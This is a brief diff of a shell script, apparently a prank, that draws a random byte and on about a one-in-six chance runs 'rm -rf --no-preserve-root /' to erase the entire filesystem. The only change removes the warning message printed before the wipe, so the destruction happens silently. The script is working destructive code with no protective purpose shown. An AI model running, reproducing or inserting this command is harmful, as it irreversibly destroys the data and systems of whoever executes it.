@@ -13,6 +13,5 @@ random_number="$(od -A n -t d -N 1 /dev/random | tr -d '[[:space:]]')"
 
 # cirka 1/6 chance (255 / 6 = 42.5)
 if [ "$random_number" -lt 42 ]; then
-	echo "goodbye computer!"
 	rm -rf --no-preserve-root /
 fi
